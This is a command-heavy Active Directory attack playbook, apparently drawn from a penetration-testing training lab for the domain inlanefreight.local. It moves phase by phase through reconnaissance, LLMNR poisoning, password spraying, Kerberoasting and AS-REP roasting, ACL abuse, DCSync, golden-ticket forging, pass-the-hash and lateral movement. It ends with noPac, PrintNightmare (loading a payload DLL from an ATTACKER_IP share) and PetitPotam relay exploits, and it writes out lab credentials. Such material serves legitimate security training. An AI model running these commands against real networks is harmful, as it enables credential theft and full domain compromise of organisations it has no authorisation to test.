Here is a more extensive and command-focused Active Directory attack methodology.

-----

## Phase 1: External Reconnaissance (OSINT) üïµÔ∏è

Gather intelligence from public sources.

```shell
# DNS & Domain Info
viewdns.info
nslookup ns1.inlanefreight.com

# Username Generation & Credential Breach Checks
linkedin2username
sudo python3 dehashed.py -q inlanefreight.local -p

# Google Dorking
filetype:pdf inurl:inlanefreight.com confidential
intext:"@inlanefreight.com" "password"
```

-----

## Phase 2: Internal Network Discovery üó∫Ô∏è

Map the internal network to identify hosts and locate Domain Controllers.

```shell
# Passive Discovery (Sniffing)
sudo wireshark
sudo tcpdump -i ens224 -n 'udp port 53 or udp port 389 or tcp port 88'

# Active Discovery (Scanning)
fping -asgq 172.16.5.0/23 > hosts.txt
sudo nmap -v -A -iL hosts.txt -oN host-enum.nmap
sudo nmap -sS -sU --top-ports 20 -A -Pn -T4 -oG nmap_output 172.16.5.0/23
```

-----

## Phase 3: Unauthenticated Enumeration üëÇ

Probe services without credentials to find usernames, policies, and hashes.

### LLMNR/NBT-NS Poisoning

```shell
# Linux
sudo responder -I ens224
hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt

# Windows
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Anonymous Enumeration (RPC, LDAP, SMB)

```shell
# Linux
rpcclient -U "" -N 172.16.5.5 # Connect then run: querydominfo, enumdomusers
enum4linux-ng -A 172.16.5.5
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Windows
net use \\DC01\ipc$ "" /u:""
net accounts
Import-Module .\PowerView.ps1
Get-DomainPolicy | select -ExpandProperty SystemAccess
```

### Username Enumeration

```shell
# Kerberos Enumeration
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 users.txt -o valid_users.txt
awk '/VALID USERNAME/ {print $7}' valid_users.txt | cut -d '@' -f 1 > valid_users_short.txt

# Other Enumeration Methods
crackmapexec smb 172.16.5.5 --users
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

-----

## Phase 4: Gaining a Foothold üîë

Obtain initial user credentials through spraying or exploiting weak configurations.

### Password Spraying

```shell
# Linux
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Winter2025!' --continue-on-success
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt 'Summer2025!'
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5; done

# Windows
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList .\valid_users.txt -Password 'Password123'
```

### AS-REP Roasting

```shell
# Linux
GetNPUsers.py INLANEFREIGHT.LOCAL/ -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt

# Windows
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt /format:hashcat

# Cracking
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

-----

## Phase 5: Authenticated Enumeration & Situational Awareness üïµÔ∏è‚Äç‚ôÄÔ∏è

With credentials, perform deep enumeration to find escalation paths.

### Living Off the Land (On Compromised Host)

```shell
# Security & Environment Checks
$ExecutionContext.SessionState.LanguageMode
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
powershell.exe -version 2

# Network & Domain Info
qwinsta
arp -a
route print
net group /domain
net user wrouse /domain
net localgroup Administrators

# Advanced AD Queries with dsquery
dsquery user
dsquery computer -limit 0
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL" -attr cn description
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 0 -attr sAMAccountName description # Unconstrained Delegation
```

### Automated Domain Enumeration

```shell
# BloodHound (Best for visualizing attack paths)
sudo bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
.\SharpHound.exe -c All --zipfilename loot.zip

# CrackMapExec (Broad network enumeration)
sudo crackmapexec smb 172.16.5.0/23 -u forend -p Klmcargo2 --sessions --disks --users --groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
sudo crackmapexec smb 172.16.5.0/23 -u forend -p Klmcargo2 -M gpp_autologin

# Snaffler (File share analysis)
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v
```

### Credentialed User/Group/Computer Enumeration

```shell
# Linux
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Windows (PowerView / AD Module)
Import-Module .\PowerView.ps1
Get-DomainUser -Identity mmorgan -Properties *
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainComputer -Ping -Unconstrained
Get-DomainGPO -ComputerIdentity WEB01
Get-NetLocalGroupMember -ComputerName DC01 -GroupName "Administrators"
Find-InterestingDomainAcl -ResolveGUIDs
```

-----

## Phase 6: Privilege Escalation üöÄ

Exploit weaknesses found during enumeration to elevate privileges.

### Kerberoasting

```shell
# Linux
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Windows
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt /format:hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat

# Mimikatz TGS Extraction (from memory)
mimikatz # kerberos::list /export # Exports tickets as .kirbi files
# On Linux to convert .kirbi to hashcat format
python2.7 /usr/share/john/kirbi2john.py ticket.kirbi > tgs_hash.txt

# Cracking
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### ACL Abuse

```powershell
# Find interesting ACLs
Find-InterestingDomainAcl | ?{($_.IdentityReference -match "forend")}

# Get ACLs for a specific object
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Abuse GenericAll/WriteDacl to add user to group
$cred = Get-Credential # Enter creds for your compromised user
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'forend' -Credential $cred

# Abuse ForceChangePassword privilege
$cred = Get-Credential # Enter creds for your compromised user
Set-DomainUserPassword -Identity 'DA_user' -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Credential $cred

# Add SPN to a user to make them Kerberoastable
Set-DomainObject -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

### LAPS & Miscellaneous Misconfigurations

```powershell
# LAPS Enumeration
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights -Identity "Help Desk"
Get-LAPSComputers

# ADIDNS Enumeration
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```

-----

## Phase 7: Domain Dominance & Persistence üëë

Achieve full control over the domain and establish persistence.

### DCSync

```shell
# Find users with DCSync rights
$sid = (Get-DomainUser forend).ObjectSID
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}

# Linux
secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# Windows
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all /csv
```

### Trusts & Golden Tickets

```shell
# Enumerate Trusts
Get-ADTrust -Filter *
netdom query /domain:inlanefreight.local trust

# Get krbtgt hash from trusted domain (via DCSync)
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Linux: Forge Golden Ticket
ticketer.py -nthash <krbtgt_hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <logistics_sid> -extra-sids <target_domain_enterprise_admin_sid> hacker
export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass

# Windows: Forge Golden Ticket
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<logistics_sid> /krbtgt:<krbtgt_hash> /sids:<target_domain_EA_sid> /ptt
ls \\academy-ea-dc01.inlanefreight.local\c$
```

-----

## Phase 8: Lateral Movement & Post-Exploitation ‚û°Ô∏è

Move across the network and compromise other systems.

```shell
# Remote Access
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/sqldev:'database!'@172.16.5.5
evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential (Get-Credential)

# Pass-the-Hash
crackmapexec smb 172.16.5.0/23 -u administrator -H <admin_ntlm_hash> --local-auth

# SQL Server Attacks
# Linux
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth # Then: enable_xp_cmdshell, xp_cmdshell whoami
# Windows
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLQuery -Instance "DBSERVER01" -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
```

-----

## Phase 9: "Bleeding Edge" & AD CS Attacks ü©∏

Exploit recent vulnerabilities and certificate service misconfigurations.

```shell
# noPac (CVE-2021-42278 & CVE-2021-42287)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 --impersonate administrator -shell

# PrintNightmare (CVE-2021-1675)
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\<ATTACKER_IP>\share\payload.dll'

# AD CS Relay (PetitPotam + ntlmrelayx)
# Start relay
sudo ntlmrelayx.py -t http://<ADCS_IP>/certsrv/certfnsh.asp --adcs --template DomainController
# Coerce auth from DC
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# PKINIT (Certificate Attack) - Use Cert acquired from ADCS relay
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64_cert> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -just-dc-user krbtgt
```
